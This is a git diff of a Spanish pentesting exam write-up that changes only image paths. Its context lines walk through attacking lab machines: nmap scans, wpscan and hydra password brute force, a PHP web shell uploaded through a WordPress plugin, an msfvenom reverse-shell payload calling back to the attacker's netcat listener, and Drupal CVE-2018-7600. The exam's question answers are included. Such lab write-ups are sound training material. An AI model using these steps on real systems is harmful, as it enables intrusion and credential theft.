@@ -12,13 +12,13 @@ ip a
 ```
 
 
-![Pasted image 20251021062111](../../Anexos/Pasted%20image%2020251021062111.png)
+![Pasted image 20251021062111](../Anexos/Pasted%20image%2020251021062111.png)
 
 ```bash
 arp-scan -I eth0 --localnet 
 ```
 
-![Pasted image 20251021064118](../../Anexos/Pasted%20image%2020251021064118.png)
+![Pasted image 20251021064118](../Anexos/Pasted%20image%2020251021064118.png)
 
 Ahora que tenemos la lista de ips, vamos a ejecutar un escaneo básico masivo de nmap para hacer un reconocimiento rápido y básico de puertos abiertos, usando el siguiente comando de nmap:
 
@@ -36,7 +36,7 @@ Luego, para un escaneo completo, lanzo el siguiente comando de nmap:
 nmap -sS -p- -n -Pn -vvv --open --min-rate 5000 -oN ports 192.168.100.50
 ```
 
-![Pasted image 20251021065331](../../Anexos/Pasted%20image%2020251021065331.png)
+![Pasted image 20251021065331](../Anexos/Pasted%20image%2020251021065331.png)
 
 También hacemos un ping para ver ante que sistema estamos:
 
@@ -44,7 +44,7 @@ También hacemos un ping para ver ante que sistema estamos:
 ping -c 1 192.168.100.50
 ```
 
-![Pasted image 20251021065413](../../Anexos/Pasted%20image%2020251021065413.png)
+![Pasted image 20251021065413](../Anexos/Pasted%20image%2020251021065413.png)
 
 Estamos ante una máquina windows.
 
@@ -63,7 +63,7 @@ nmap -sCV -p22,3389,5910,45656 -n -Pn -oN versions 192.168.100.5
 
 En el servicio http corre una página web, así que vamos a echarle un vistazo:
 
-![Pasted image 20251021070326](../../Anexos/Pasted%20image%2020251021070326.png)
+![Pasted image 20251021070326](../Anexos/Pasted%20image%2020251021070326.png)
 
 Vemos muchas cosas de primeras, así que vamos primero a realizar fuzzing para encontrar directorios:
 
@@ -71,7 +71,7 @@ Vemos muchas cosas de primeras, así que vamos primero a realizar fuzzing para e
 dirb http://192.168.100.50/
 ```
 
-![Pasted image 20251021071356](../../Anexos/Pasted%20image%2020251021071356.png)
+![Pasted image 20251021071356](../Anexos/Pasted%20image%2020251021071356.png)
 
 Vemos que en el dominio nos está aplicando virtual hosting, por lo que vamos a añadir ese dominio a nuestro archivo local de hosts:
 
@@ -79,9 +79,9 @@ Vemos que en el dominio nos está aplicando virtual hosting, por lo que vamos a 
 nano /etc/hosts
 ```
 
-![Pasted image 20251021071746](../../Anexos/Pasted%20image%2020251021071746.png)
+![Pasted image 20251021071746](../Anexos/Pasted%20image%2020251021071746.png)
 
-![Pasted image 20251021071829](../../Anexos/Pasted%20image%2020251021071829.png)
+![Pasted image 20251021071829](../Anexos/Pasted%20image%2020251021071829.png)
 
 En este punto, vamos a utilizar el comando wpscan para analizar el sitio web en búsqueda de vulnerabilidades, plugins y usuarios:
 
@@ -91,11 +91,11 @@ wpscan --url http://192.168.100.50/wordpress/ --enumerate u,vp
 
 No nos muestra info ni de plugins ni de usuarios, así que vamos a intentar enumerar manualmente. Si ponemos un usuario inventado, nos da el siguiente error:
 
-![Pasted image 20251021074257](../../Anexos/Pasted%20image%2020251021074257.png)
+![Pasted image 20251021074257](../Anexos/Pasted%20image%2020251021074257.png)
 
 Pero si ponemos admin y una contraseña incorrecta, vemos esto otro:
 
-![Pasted image 20251021074333](../../Anexos/Pasted%20image%2020251021074333.png)
+![Pasted image 20251021074333](../Anexos/Pasted%20image%2020251021074333.png)
 
 Sabiendo esto, vamos a intentar hacer fuerza bruta con wpscan para sacar la contraseña:
 
@@ -105,21 +105,21 @@ wpscan --url http://192.168.100.50/wordpress/ -U admin -P /usr/share/wordlists/r
 
 La tenemos, la contrasña es **estrella**
 
-![Pasted image 20251021074619](../../Anexos/Pasted%20image%2020251021074619.png)
+![Pasted image 20251021074619](../Anexos/Pasted%20image%2020251021074619.png)
 
 Nos conectamos, y vemos un plugin de gestión de archivos, al que podemos acceder. Vamos a entrar en la carpeta de my-admin, y vamos a crear  un archivo php malicioso para lograr ejecución remota de comandos:
 
-![Pasted image 20251021082955](../../Anexos/Pasted%20image%2020251021082955.png)
+![Pasted image 20251021082955](../Anexos/Pasted%20image%2020251021082955.png)
 
 Lo creamos con nano y lo llamamos, por ejemplo, ataque.php:
 
-![Pasted image 20251021083344](../../Anexos/Pasted%20image%2020251021083344.png)
+![Pasted image 20251021083344](../Anexos/Pasted%20image%2020251021083344.png)
 
-![Pasted image 20251021083515](../../Anexos/Pasted%20image%2020251021083515.png)
+![Pasted image 20251021083515](../Anexos/Pasted%20image%2020251021083515.png)
 
 Ahora vamos a comprobar que existe la ruta: http://wordpress.local/wp-admin/ataque.php
 
-![Pasted image 20251021083627](../../Anexos/Pasted%20image%2020251021083627.png)
+![Pasted image 20251021083627](../Anexos/Pasted%20image%2020251021083627.png)
 
 Existe y además hemos rooteado con éxito la primera máquina. Ahora, voy a enviarme una reverse shell a mi máquina atacante, para trabajar desde consola en local. Para ello, me pongo en escucha con netcat en mi máquina atacante por el puerto 443 con el siguiente comando:
 
@@ -127,7 +127,7 @@ Existe y además hemos rooteado con éxito la primera máquina. Ahora, voy a env
 nc -lnvp 443
 ```
 
-![Pasted image 20251021084011](../../Anexos/Pasted%20image%2020251021084011.png)
+![Pasted image 20251021084011](../Anexos/Pasted%20image%2020251021084011.png)
 
 Y ahora ejecutamos el siguiente comando dentro de la URL:
 
@@ -135,7 +135,7 @@ Y ahora ejecutamos el siguiente comando dentro de la URL:
 msfvenom -p php/reverse_php LHOST=192.168.100.5 LPORT=443 -o shell.php
 ```
 
-![Pasted image 20251021090604](../../Anexos/Pasted%20image%2020251021090604.png)
+![Pasted image 20251021090604](../Anexos/Pasted%20image%2020251021090604.png)
 
 Subimos el archivo al plugin y lo ejecutamos desde su ruta:
 
@@ -143,22 +143,22 @@ Subimos el archivo al plugin y lo ejecutamos desde su ruta:
 http://wordpress.local/wp-admin/shell.php
 ```
 
-![Pasted image 20251021090728](../../Anexos/Pasted%20image%2020251021090728.png)
+![Pasted image 20251021090728](../Anexos/Pasted%20image%2020251021090728.png)
 
 Estamos en la máquina. Ahora hacemos un **ipconfig** para ver nuestra interfaz de red:
 
-![900](../../Anexos/Pasted%20image%2020251021091214.png)
+![900](../Anexos/Pasted%20image%2020251021091214.png)
 
 No tenemos conexión con ninguna otra máquina, así que vamos a intentar responder todas las preguntas del examen relacionadas con esta máquina.:
 
 
-![700](../../Anexos/Pasted%20image%2020251021071114.png)
+![700](../Anexos/Pasted%20image%2020251021071114.png)
 
 Para resolver esta pregunta, vamos a realizar un ataque de fuerza bruta con METASPLOIT:
 
 Utilizando metasploit, con el payload **scanner/smb/smb_login** y seteando como PASS_FILE un archivo .txt con las cuatro opciones, nos arroja lo siguiente:
 
-![Pasted image 20251021092144](../../Anexos/Pasted%20image%2020251021092144.png)
+![Pasted image 20251021092144](../Anexos/Pasted%20image%2020251021092144.png)
 
 ### 192.168.100.51 - WINSERVER-02
 ____
@@ -169,13 +169,13 @@ Luego, para un escaneo completo, lanzo el siguiente comando de nmap:
 nmap -sS -p- -n -Pn -vvv --open --min-rate 5000 -oN ports 192.168.100.51
 ```
 
-![Pasted image 20251021095035](../../Anexos/Pasted%20image%2020251021095035.png)
+![Pasted image 20251021095035](../Anexos/Pasted%20image%2020251021095035.png)
 
 ```bash
 ping -c 1 192.168.100.5
 ```
 
-![Pasted image 20251021095110](../../Anexos/Pasted%20image%2020251021095110.png)
+![Pasted image 20251021095110](../Anexos/Pasted%20image%2020251021095110.png)
 
 Estamos ante otra máquina winows.
 Ahora vamos a lanzar el segundo comando de nmap para escanear las versiones de los servicios que corren por esos puertos y vamos también a lanzar unos scripts básicos de reconocimiento de vulnerabilidades, con el siguiente comando:
@@ -186,11 +186,11 @@ nmap -sCV -n -Pn -vvv --min-rate 5000 -oN versions 192.168.100.51 -p21,80,135,13
 
 De primeras, vemos el nombre del host: **WINSERVER-02**
 
-![Pasted image 20251021095800](../../Anexos/Pasted%20image%2020251021095800.png)
+![Pasted image 20251021095800](../Anexos/Pasted%20image%2020251021095800.png)
 
 Además de un sitio web, vemos también lo siguiente:
 
-![Pasted image 20251021095850](../../Anexos/Pasted%20image%2020251021095850.png)
+![Pasted image 20251021095850](../Anexos/Pasted%20image%2020251021095850.png)
 
 El login anónimo de ftp está habilitado, así que vamos a acceder:
 
@@ -202,7 +202,7 @@ Entramos con el comando:
 ftp 192.168.100.51
 ```
 
-![Pasted image 20251021100010](../../Anexos/Pasted%20image%2020251021100010.png)
+![Pasted image 20251021100010](../Anexos/Pasted%20image%2020251021100010.png)
 
 Nos descargamos todos los archivos con el siguiente comando:
 
@@ -210,7 +210,7 @@ Nos descargamos todos los archivos con el siguiente comando:
 mget *
 ```
 
-![Pasted image 20251021100244](../../Anexos/Pasted%20image%2020251021100244.png)
+![Pasted image 20251021100244](../Anexos/Pasted%20image%2020251021100244.png)
 
 Al ver el archivo cmdasp.aspx, voy a probar introducirlo en la ruta del navegador para ver de qué se trata:
 
@@ -218,11 +218,11 @@ Al ver el archivo cmdasp.aspx, voy a probar introducirlo en la ruta del navegado
 http://192.168.100.51/cmdasp.aspx
 ```
 
-![Pasted image 20251021100646](../../Anexos/Pasted%20image%2020251021100646.png)
+![Pasted image 20251021100646](../Anexos/Pasted%20image%2020251021100646.png)
 
 Tenemos ejecución directa de comandos con el usuario **nt authority\system**
 
-![Pasted image 20251021104857](../../Anexos/Pasted%20image%2020251021104857.png)
+![Pasted image 20251021104857](../Anexos/Pasted%20image%2020251021104857.png)
 
 Esta máquina tampoco tiene conectividad con ninguna, así que vamos a tratar de responder las preguntas asociadas a esta áquina.
 
@@ -235,13 +235,13 @@ Luego, para un escaneo completo, lanzo el siguiente comando de nmap:
 nmap -sS -p- -n -Pn -vvv --open --min-rate 5000 -oN ports 192.168.100.52
 ```
 
-![Pasted image 20251021110127](../../Anexos/Pasted%20image%2020251021110127.png)
+![Pasted image 20251021110127](../Anexos/Pasted%20image%2020251021110127.png)
 
 ```bash
 ping -c 1 192.168.100.5
 ```
 
-![Pasted image 20251021110231](../../Anexos/Pasted%20image%2020251021110231.png)
+![Pasted image 20251021110231](../Anexos/Pasted%20image%2020251021110231.png)
 
 Es un sistema linux. Ahora vamos a ejecutar otro comando de nmap para ver qué versiones y vulnerabilidades básicas encontramos:
 
@@ -251,7 +251,7 @@ nmap -sCV -n -Pn -vvv --min-rate 5000 -p21,22,80,139,445,3306,3389 --open -oN ve
 
 Ya vemos aquí la primera vulnerabilidad:
 
-![Pasted image 20251021110812](../../Anexos/Pasted%20image%2020251021110812.png)
+![Pasted image 20251021110812](../Anexos/Pasted%20image%2020251021110812.png)
 
 Vamos a traernos ese archivo a local:
 
@@ -261,7 +261,7 @@ Vamos a traernos ese archivo a local:
 
 Nos descubren al usuario **admin**. Vamos a ver el servicio web:
 
-![Pasted image 20251021110955](../../Anexos/Pasted%20image%2020251021110955.png)
+![Pasted image 20251021110955](../Anexos/Pasted%20image%2020251021110955.png)
 
 Se trata de un drupal, y además es la sección más densa de la prueba.
 
@@ -271,7 +271,7 @@ Buscando info en internet, encuentro esta vulnerabilidad grave: **CVE-2018-7600*
 
 Seteamos las opciones y lo ejecutmos:
 
-![Pasted image 20251021122044](../../Anexos/Pasted%20image%2020251021122044.png)
+![Pasted image 20251021122044](../Anexos/Pasted%20image%2020251021122044.png)
 
 Ya estamos dentro de la máquina, ahora voy a enviarme una reverse shell a mi máquina atacante para tener una conexión más estable. Después de hacerlo y realizar el tratamiento de la tty, vamos a intentar entrar como el usuario admin por ssh a la máquina:
 
@@ -279,11 +279,11 @@ Ya estamos dentro de la máquina, ahora voy a enviarme una reverse shell a mi m�
 hydra -l dbadmin -P /usr/share/wordlists/rockyou.txt -I ssh://192.168.100.52
 ```
 
-![Pasted image 20251021125941](../../Anexos/Pasted%20image%2020251021125941.png)
+![Pasted image 20251021125941](../Anexos/Pasted%20image%2020251021125941.png)
 
 Accedemos por SSH:
 
-![Pasted image 20251021143610](../../Anexos/Pasted%20image%2020251021143610.png)
+![Pasted image 20251021143610](../Anexos/Pasted%20image%2020251021143610.png)
 
 Usando el siguiente comando busco binarios con SUID:
 
@@ -291,9 +291,9 @@ Usando el siguiente comando busco binarios con SUID:
 find / -perm -4000 2>/dev/null
 ```
 
-![Pasted image 20251021143959](../../Anexos/Pasted%20image%2020251021143959.png)
+![Pasted image 20251021143959](../Anexos/Pasted%20image%2020251021143959.png)
 
-![Pasted image 20251021144019](../../Anexos/Pasted%20image%2020251021144019.png)
+![Pasted image 20251021144019](../Anexos/Pasted%20image%2020251021144019.png)
 
 ![Pasted image 20251021144052.png](Pasted%20image%2020251021144052.png)
 
@@ -301,11 +301,11 @@ Máquina rooteada.
 
 En el archivo settings.php encontramos las siguientes credenciales:
 
-![Pasted image 20251021190050](../../Anexos/Pasted%20image%2020251021190050.png)
+![Pasted image 20251021190050](../Anexos/Pasted%20image%2020251021190050.png)
 
 Accedemos desde root de todas formas:
 
-![Pasted image 20251022124106](../../Anexos/Pasted%20image%2020251022124106.png)
+![Pasted image 20251022124106](../Anexos/Pasted%20image%2020251022124106.png)
 
 
 
@@ -318,13 +318,13 @@ Luego, para un escaneo completo, lanzo el siguiente comando de nmap:
 nmap -sS -p- -n -Pn -vvv --open --min-rate 5000 -oN ports 192.168.100.55 
 ```
 
-![Pasted image 20251021160207](../../Anexos/Pasted%20image%2020251021160207.png)
+![Pasted image 20251021160207](../Anexos/Pasted%20image%2020251021160207.png)
 
 ```bash
 ping -c 1 192.168.100.5
 ```
 
-![Pasted image 20251021160240](../../Anexos/Pasted%20image%2020251021160240.png)
+![Pasted image 20251021160240](../Anexos/Pasted%20image%2020251021160240.png)
 
 Es un sistema windows. Ahora vamos a ejecutar otro comando de nmap para ver qué versiones y vulnerabilidades básicas encontramos:
 
@@ -332,7 +332,7 @@ Es un sistema windows. Ahora vamos a ejecutar otro comando de nmap para ver qué
 nmap -sCV -n -Pn -vvv --min-rate 5000 -p80,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671,49692 --open -oN versions 192.168.100.55
 ```
 
-![Pasted image 20251021160753](../../Anexos/Pasted%20image%2020251021160753.png)
+![Pasted image 20251021160753](../Anexos/Pasted%20image%2020251021160753.png)
 
 Tenemos el hostname.
 Si haemos fuerza bruta con el usuario Administrator, la obtenemos:
@@ -341,15 +341,15 @@ Si haemos fuerza bruta con el usuario Administrator, la obtenemos:
 hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -I smb://192.168.100.55
 ```
 
-![Pasted image 20251021161344](../../Anexos/Pasted%20image%2020251021161344.png)
+![Pasted image 20251021161344](../Anexos/Pasted%20image%2020251021161344.png)
 
 Accedemos por rdp:
 
 
 
-![900](../../Anexos/Pasted%20image%2020251022072236.png)
+![900](../Anexos/Pasted%20image%2020251022072236.png)
 
-![900](../../Anexos/Pasted%20image%2020251022073006.png)
+![900](../Anexos/Pasted%20image%2020251022073006.png)
 
 
 
@@ -376,13 +376,13 @@ Ahora haago port forwarding a mi máquina para ver los servicios web, y nos enco
 - **192.168.0.61**:  Nada
 - **192.168.0.255**:  Nada
 
-![600](../../Anexos/Pasted%20image%2020251022122149.png)
+![600](../Anexos/Pasted%20image%2020251022122149.png)
 
 con smb login, localizo las credenciales:
 
 ![Pasted image 20251022115624.png](Pasted%20image%2020251022115624.png)
 
-![Pasted image 20251022115642](../../Anexos/Pasted%20image%2020251022115642.png)
+![Pasted image 20251022115642](../Anexos/Pasted%20image%2020251022115642.png)
 
 
 ![Pasted image 20251022121935.png](Pasted%20image%2020251022121935.png)
@@ -407,11 +407,11 @@ En la ruta http://192.168.100.50/wordpress se encuentra instalado un wordpress, 
 
 ### PREGUNTA 2
 ____
-![|800](../../Anexos/Pasted%20image%2020251021181205.png)
+![|800](../Anexos/Pasted%20image%2020251021181205.png)
 
 **EXPLICACIÓN**
 
-![500](../../Anexos/Pasted%20image%2020251021181115.png)
+![500](../Anexos/Pasted%20image%2020251021181115.png)
 ### PREGUNTA 3
 ___
 ![800](Pasted%20image%2020251021080049.png)
@@ -420,7 +420,7 @@ ___
 
 Si hacemos un escaneo masivo a todas las ips, pero solo por el puerto 80, vemos lo siguiente:
 
-![800](../../Anexos/Pasted%20image%2020251021080746.png)
+![800](../Anexos/Pasted%20image%2020251021080746.png)
 
 ### PREGUNTA 4
 ____
@@ -428,22 +428,22 @@ ____
 
 **EXPLICACIÓN**
 
-![Pasted image 20251021114411](../../Anexos/Pasted%20image%2020251021114411.png)
+![Pasted image 20251021114411](../Anexos/Pasted%20image%2020251021114411.png)
 
 ### PREGUNTA 5
 ___
-![800](../../Anexos/Pasted%20image%2020251021123406.png)
+![800](../Anexos/Pasted%20image%2020251021123406.png)
 
 **EXPLICACIÓN**
 
-![Pasted image 20251021123339](../../Anexos/Pasted%20image%2020251021123339.png)
+![Pasted image 20251021123339](../Anexos/Pasted%20image%2020251021123339.png)
 ### PREGUNTA 6
 ____
-![800](../../Anexos/Pasted%20image%2020251021111808.png)
+![800](../Anexos/Pasted%20image%2020251021111808.png)
 
 **EXPLICACIÓN**
 
-![Pasted image 20251021111322](../../Anexos/Pasted%20image%2020251021111322.png)
+![Pasted image 20251021111322](../Anexos/Pasted%20image%2020251021111322.png)
 
 ### PREGUNTA 7
 ___
@@ -451,10 +451,10 @@ ___
 
 **EXPLICACIÓN**
 
-![Pasted image 20251022124339](../../Anexos/Pasted%20image%2020251022124339.png)
+![Pasted image 20251022124339](../Anexos/Pasted%20image%2020251022124339.png)
 ### PREGUNTA 8
 ___
-![800](../../Anexos/Pasted%20image%2020251021124634.png)
+![800](../Anexos/Pasted%20image%2020251021124634.png)
 
 **EXPLICACIÓN**
 
@@ -474,11 +474,11 @@ De momento es creencia ya que puedo ver que solo las IPs **192.168.100.52** y **
 
 Confirmado:
 
-![Pasted image 20251021125941](../../Anexos/Pasted%20image%2020251021125941.png)
+![Pasted image 20251021125941](../Anexos/Pasted%20image%2020251021125941.png)
 
 ### PREGUNTA 10 nada
 ____
-![800](../../Anexos/Pasted%20image%2020251022132348.png)
+![800](../Anexos/Pasted%20image%2020251022132348.png)
 ### PREGUNTA 11
 ____
 ![800](Pasted%20image%2020251021150504.png)
@@ -489,7 +489,7 @@ En la configuración, habían unos archivos php ejecutables con permisos de escr
 
 ### PREGUNTA 12
 ____
-![800](../../Anexos/Pasted%20image%2020251021152421.png)
+![800](../Anexos/Pasted%20image%2020251021152421.png)
 
 **EXPLICACIÓN**
 
@@ -497,17 +497,17 @@ ____
 find / -perm -4000 2>/dev/null
 ```
 
-![Pasted image 20251021143959](../../Anexos/Pasted%20image%2020251021143959.png)
+![Pasted image 20251021143959](../Anexos/Pasted%20image%2020251021143959.png)
 
-![Pasted image 20251021144019](../../Anexos/Pasted%20image%2020251021144019.png)
+![Pasted image 20251021144019](../Anexos/Pasted%20image%2020251021144019.png)
 
 ### PREGUNTA 13 nada
 ___
-![800](../../Anexos/Pasted%20image%2020251022132753.png)
+![800](../Anexos/Pasted%20image%2020251022132753.png)
 
 ### PREGUNTA 14
 ____
-![800](../../Anexos/Pasted%20image%2020251021081719.png)
+![800](../Anexos/Pasted%20image%2020251021081719.png)
 
 **EXPLICACIÓN**
 
@@ -515,7 +515,7 @@ https://rapid7.github.io/metasploit-framework/docs/using-metasploit/intermediate
 
 ### PREGUNTA 15
 ___
-![800](../../Anexos/Pasted%20image%2020251022100101.png)
+![800](../Anexos/Pasted%20image%2020251022100101.png)
 
 **EXPLICACIÓN**
 
@@ -531,15 +531,15 @@ ____
 Pivoting realizado desde metasploit y desde la ip 192.168.100.55.
 ### PREGUNTA 17
 ____
-![800](../../Anexos/Pasted%20image%2020251021161537.png)
+![800](../Anexos/Pasted%20image%2020251021161537.png)
 
 **EXPLICACIÓN**
 
-![Pasted image 20251021161344](../../Anexos/Pasted%20image%2020251021161344.png)
+![Pasted image 20251021161344](../Anexos/Pasted%20image%2020251021161344.png)
 
 ### PREGUNTA 18
 ___
-![800](../../Anexos/Pasted%20image%2020251022120000.png)
+![800](../Anexos/Pasted%20image%2020251022120000.png)
 
 **EXPLICACIÓN**
 
@@ -547,13 +547,13 @@ ___
 
 ### PREGUNTA 19
 _____
-![700](../../Anexos/Pasted%20image%2020251021071114.png)
+![700](../Anexos/Pasted%20image%2020251021071114.png)
 
 **EXPLICACIÓN**
 
 Utilizando metasploit, con el payload **scanner/smb/smb_login** y seteando como PASS_FILE un archivo .txt con las cuatro opciones, nos arroja lo siguiente:
 
-![Pasted image 20251021092144](../../Anexos/Pasted%20image%2020251021092144.png)
+![Pasted image 20251021092144](../Anexos/Pasted%20image%2020251021092144.png)
 
 ### PREGUNTA 20
 ____
@@ -569,11 +569,11 @@ ___
 
 **EXPLICACIÓN**
 
-![800](../../Anexos/Pasted%20image%2020251022121511.png)
+![800](../Anexos/Pasted%20image%2020251022121511.png)
 
 ### PREGUNTA 22
 ___
-![800](../../Anexos/Pasted%20image%2020251022132453.png)
+![800](../Anexos/Pasted%20image%2020251022132453.png)
 
 **EXPLICACIÓN**
 
@@ -589,13 +589,13 @@ ___
 ![Pasted image 20251022125056.png](Pasted%20image%2020251022125056.png)
 ### PREGUNTA 24
 ____
-![800](../../Anexos/Pasted%20image%2020251021072433.png)
+![800](../Anexos/Pasted%20image%2020251021072433.png)
 
 **EXPLICACIÓN**
 
 Con el comando wp-scan, obtenemos la información de la versión:
 
-![Pasted image 20251021072533](../../Anexos/Pasted%20image%2020251021072533.png)
+![Pasted image 20251021072533](../Anexos/Pasted%20image%2020251021072533.png)
 
 
 ### PREGUNTA 25
@@ -610,13 +610,13 @@ En el escaneo inicial masivo, solo esta ip tiene el puerto 3307 abierto:
 
 ### PREGUNTA 26
 ____
-![800](../../Anexos/Pasted%20image%2020251021092348.png)
+![800](../Anexos/Pasted%20image%2020251021092348.png)
 
 **EXPLICACIÓN**
 
 Si leemos el archivo **wp-config** de la raíz del cms, vemos lo siguiente:
 
-![550](../../Anexos/Pasted%20image%2020251021092433.png)
+![550](../Anexos/Pasted%20image%2020251021092433.png)
 
 ### PREGUNTA 27
 ___
@@ -636,7 +636,7 @@ ____
 ### PREGUNTA 29
 ___
 
-![800](../../Anexos/Pasted%20image%2020251021101703.png)
+![800](../Anexos/Pasted%20image%2020251021101703.png)
 
 **EXPLICACIÓN**
 
@@ -646,7 +646,7 @@ Si ejecutamos este comando de nmap, poniendo el parámetro -sT y --open, nos dir
 nmap -sT -p- 192.168.100.51 --open -vvv -n -Pn --min-rate 5000
 ```
 
-![Pasted image 20251021101632](../../Anexos/Pasted%20image%2020251021101632.png)
+![Pasted image 20251021101632](../Anexos/Pasted%20image%2020251021101632.png)
 
 En total, **14**.
 
@@ -660,19 +660,19 @@ ___
 
 ### PREGUNTA 31
 ____
-![800](../../Anexos/Pasted%20image%2020251021104432.png)
+![800](../Anexos/Pasted%20image%2020251021104432.png)
 
 **EXPLICACIÓN**
 
-![Pasted image 20251021104413](../../Anexos/Pasted%20image%2020251021104413.png)
+![Pasted image 20251021104413](../Anexos/Pasted%20image%2020251021104413.png)
 
 ### PREGUNTA 32
 ____
-![Pasted image 20251021113555](../../Anexos/Pasted%20image%2020251021113555.png)
+![Pasted image 20251021113555](../Anexos/Pasted%20image%2020251021113555.png)
 
 **EXPLICACIÓN**
 
-![Pasted image 20251021113613](../../Anexos/Pasted%20image%2020251021113613.png)
+![Pasted image 20251021113613](../Anexos/Pasted%20image%2020251021113613.png)
 
 
 ### PREGUNTA 33 nada
@@ -684,7 +684,7 @@ ___
 
 **EXPLICACIÓN**
 
-![Pasted image 20251021144440](../../Anexos/Pasted%20image%2020251021144440.png)
+![Pasted image 20251021144440](../Anexos/Pasted%20image%2020251021144440.png)
 
 ### PREGUNTA 35
 ___
@@ -692,4 +692,4 @@ ___
 
 **EXPLICACIÓN**
 
-![800](../../Anexos/Pasted%20image%2020251022063652.png)
+![800](../Anexos/Pasted%20image%2020251022063652.png)
